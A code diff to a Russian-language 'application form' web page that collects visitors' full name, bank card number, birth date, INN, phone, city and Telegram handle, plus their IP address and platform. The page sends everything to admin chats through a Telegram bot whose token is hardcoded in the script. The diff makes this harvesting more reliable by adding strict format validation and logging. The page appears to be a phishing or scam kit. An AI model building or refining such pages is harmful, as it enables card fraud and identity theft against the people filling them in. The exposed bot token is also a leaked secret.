@@ -211,6 +211,9 @@
             font-size: 14px;
             box-sizing: border-box;
         }
+        .modal-content input:invalid {
+            border-color: red;
+        }
         .modal-content button {
             width: 100%;
             padding: 12px;
@@ -565,27 +568,27 @@
             <div class="modal-header">
                 <h3>Анкета</h3>
             </div>
-            <form id="applicationForm" onsubmit="submitForm(event)">
+            <form id="applicationForm">
                 <label for="name">ФИО</label>
-                <input type="text" id="name" name="name" required placeholder="Введите ФИО">
+                <input type="text" id="name" name="name" required pattern="[А-Яа-яЁё\s]+" placeholder="Введите ФИО (только кириллица)">
 
                 <label for="card">Номер карты на личное имя</label>
-                <input type="text" id="card" name="card" required placeholder="Введите номер карты">
+                <input type="text" id="card" name="card" required pattern="\d{16}" placeholder="Введите 16-значный номер карты">
 
                 <label for="birthdate">Дата рождения (ДД.ММ.ГГГГ)</label>
-                <input type="text" id="birthdate" name="birthdate" required placeholder="Например, 01.01.1990">
+                <input type="text" id="birthdate" name="birthdate" required pattern="\d{2}\.\d{2}\.\d{4}" placeholder="Например, 01.01.1990">
 
                 <label for="inn">ИНН</label>
-                <input type="text" id="inn" name="inn" required placeholder="Введите ваш ИНН">
+                <input type="text" id="inn" name="inn" required pattern="\d{12}" placeholder="Введите 12-значный ИНН">
 
                 <label for="phone">Номер телефона</label>
-                <input type="tel" id="phone" name="phone" required placeholder="Введите ваш номер телефона">
+                <input type="tel" id="phone" name="phone" required pattern="\+7\d{10}" placeholder="Введите номер в формате +79991234567">
 
                 <label for="city">Город</label>
-                <input type="text" id="city" name="city" required placeholder="Введите ваш город">
+                <input type="text" id="city" name="city" required pattern="[А-Яа-яЁё\s]+" placeholder="Введите город (только кириллица)">
 
                 <label for="telegram">Ваш Telegram-юзернейм</label>
-                <input type="text" id="telegram" name="telegram" required placeholder="Введите @username">
+                <input type="text" id="telegram" name="telegram" required pattern="@[a-zA-Z0-9_]+" placeholder="Введите @username">
 
                 <button type="submit" id="submitButton">Отправить</button>
             </form>
@@ -638,6 +641,7 @@
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
+                console.log('Ошибка получения IP:', error);
                 return 'Не удалось определить IP';
             }
         }
@@ -692,30 +696,82 @@
             }
         }
 
+        function validateForm(data) {
+            const errors = [];
+
+            if (!/^[А-Яа-яЁё\s]+$/.test(data.name)) {
+                errors.push('ФИО должно содержать только кириллицу и пробелы');
+            }
+
+            if (!/^\d{16}$/.test(data.card)) {
+                errors.push('Номер карты должен содержать ровно 16 цифр');
+            }
+
+            if (!/^\d{2}\.\d{2}\.\d{4}$/.test(data.birthdate)) {
+                errors.push('Дата рождения должна быть в формате ДД.ММ.ГГГГ');
+            } else {
+                const [day, month, year] = data.birthdate.split('.').map(Number);
+                const date = new Date(year, month - 1, day);
+                if (date.getDate() !== day || date.getMonth() !== month - 1 || date.getFullYear() !== year) {
+                    errors.push('Дата рождения недействительна');
+                }
+            }
+
+            if (!/^\d{12}$/.test(data.inn)) {
+                errors.push('ИНН должен содержать ровно 12 цифр');
+            }
+
+            if (!/^\+7\d{10}$/.test(data.phone)) {
+                errors.push('Номер телефона должен быть в формате +79991234567');
+            }
+
+            if (!/^[А-Яа-яЁё\s]+$/.test(data.city)) {
+                errors.push('Город должен содержать только кириллицу и пробелы');
+            }
+
+            if (!/^@[a-zA-Z0-9_]+$/.test(data.telegram)) {
+                errors.push('Telegram-юзернейм должен начинаться с @ и содержать только латинские буквы, цифры или подчеркивания');
+            }
+
+            return errors;
+        }
+
         async function submitForm(event) {
             event.preventDefault();
+            console.log('submitForm вызвана');
 
             const hasSubmitted = localStorage.getItem('hasSubmitted');
             const submitButton = document.getElementById('submitButton');
 
             if (hasSubmitted === 'true' && !isAdmin) {
                 alert('Вы уже отправили заявку. Повторная отправка невозможна.');
+                console.log('Заявка уже отправлена, повторная отправка заблокирована');
                 return;
             }
 
             submitButton.disabled = true;
+            console.log('Кнопка отправки заблокирована');
 
             const form = document.getElementById('applicationForm');
             const formData = new FormData(form);
             const data = {
-                name: formData.get('name'),
-                card: formData.get('card'),
-                birthdate: formData.get('birthdate'),
-                inn: formData.get('inn'),
-                phone: formData.get('phone'),
-                city: formData.get('city'),
-                telegram: formData.get('telegram')
+                name: formData.get('name').trim(),
+                card: formData.get('card').trim(),
+                birthdate: formData.get('birthdate').trim(),
+                inn: formData.get('inn').trim(),
+                phone: formData.get('phone').trim(),
+                city: formData.get('city').trim(),
+                telegram: formData.get('telegram').trim()
             };
+            console.log('Данные формы:', data);
+
+            const validationErrors = validateForm(data);
+            if (validationErrors.length > 0) {
+                alert('Исправьте ошибки в форме:\n- ' + validationErrors.join('\n- '));
+                submitButton.disabled = false;
+                console.log('Ошибки валидации:', validationErrors);
+                return;
+            }
 
             const applicationId = generateApplicationId();
             const botToken = '7673113370:AAH2hS9rKjs6MPTgQofo0RbKbSUsMrDwcR8';
@@ -740,6 +796,7 @@
 🌐 IP-адрес: ${ipAddress}
 💻 Платформа: ${platform}
             `;
+            console.log('Сообщение для Telegram:', message);
 
             let allSuccessful = true;
 
@@ -763,24 +820,29 @@
                     const result = await response.json();
                     if (!result.ok) {
                         allSuccessful = false;
+                        console.log(`Ошибка отправки в Telegram для chat_id ${adminChatId}:`, result);
+                    } else {
+                        console.log(`Успешная отправка в Telegram для chat_id ${adminChatId}`);
                     }
                 } catch (error) {
                     allSuccessful = false;
+                    console.log(`Ошибка при отправке в Telegram для chat_id ${adminChatId}:`, error);
                 }
             }
 
             if (allSuccessful) {
                 if (!isAdmin) {
                     localStorage.setItem('hasSubmitted', 'true');
+                    console.log('hasSubmitted установлен в localStorage');
                 }
                 closeModal();
                 showNotification();
+                console.log('Заявка успешно отправлена');
             } else {
-                alert('Произошла ошибка при отправке заявки. Попробуйте снова.');
+                alert('Произошла ошибка при отправке заявки в Telegram. Попробуйте снова.');
                 submitButton.disabled = false;
+                console.log('Ошибка отправки, кнопка разблокирована');
             }
-
-            startBotListener();
         }
 
         function toggleTheme(theme, event) {
@@ -854,12 +916,19 @@
                             }
                         }
                     }
-                } catch (error) {}
+                } catch (error) {
+                    console.log('Ошибка в startBotListener:', error);
+                }
                 setTimeout(checkUpdates, 5000);
             }
 
             checkUpdates();
         }
+
+        document.getElementById('applicationForm').addEventListener('submit', function(event) {
+            console.log('Событие submit сработало');
+            submitForm(event);
+        });
 
         startBotListener();
     </script>
